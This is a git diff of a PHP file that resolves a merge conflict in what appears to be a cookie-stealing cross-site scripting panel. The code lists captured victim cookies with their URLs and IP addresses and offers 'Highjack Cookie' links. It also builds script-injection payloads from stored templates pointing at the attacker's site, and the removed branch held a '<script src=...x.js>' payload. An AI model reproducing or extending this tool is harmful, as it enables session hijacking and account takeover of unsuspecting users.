@@ -62,33 +62,20 @@ if(isset($_GET['cookieID'])) {
 ## Print Cookies to Page
 if($cookies->recordCount>0) {
   foreach($cookies->results as $cookie) {
-<<<<<<< HEAD
     $cookieResults .= "<div class=\"column\">#".$cookie['id']."</div><div class=\"column\" style=\"width:50%;\">".$cookie['url']." (".$cookie['ip'].")</div><div class=\"column right\"><a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack Cookie</a></div><br clear=\"both\"/><hr/>";
   }
 } else {
   $cookieResults = "Cookie #".$cookie['id']."not found.";
   $cookieResults = "<div style=\"padding:10px 0 0 10px;\">no cookies found.</div>";
-=======
-    $cookieResults .= "<div class=\"column\">#".$cookie['id']."</div><div class=\"column\" style=\"width:50%;\">".$cookie['url']." (".$cookie['ip'].")</div><div class=\"column right\"><a href=\"?cookieID=".$cookie['id']."&action=refresh\">Refresh</a> - <a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack</a></div><br clear=\"both\"/>";
-  }
-} else {
-  $cookieResults = "Cookie #".$cookie['id']."not found.";
->>>>>>> a765228d6b9b129e5db14207d006a4689f83af13
 }
 
 ////////////////////////////////////
 ## SET ATTACK/PAYLOAD
-<<<<<<< HEAD
 $pl = $catcher->payloads();
 foreach($pl->results as $payload) {
   $payloads[$payload['id']]['name'] = $payload['name']; 
   $payloads[$payload['id']]['payload'] = urlencode(str_replace('{siteURL}',$siteURL,$payload['payload'])); 
 }
-=======
-$attack = 'x.js';
-$payload = sprintf('<script src="%s%s"/>', $siteURL, $attack);
-$payload = htmlspecialchars($payload);
->>>>>>> a765228d6b9b129e5db14207d006a4689f83af13
 
 ?>
 
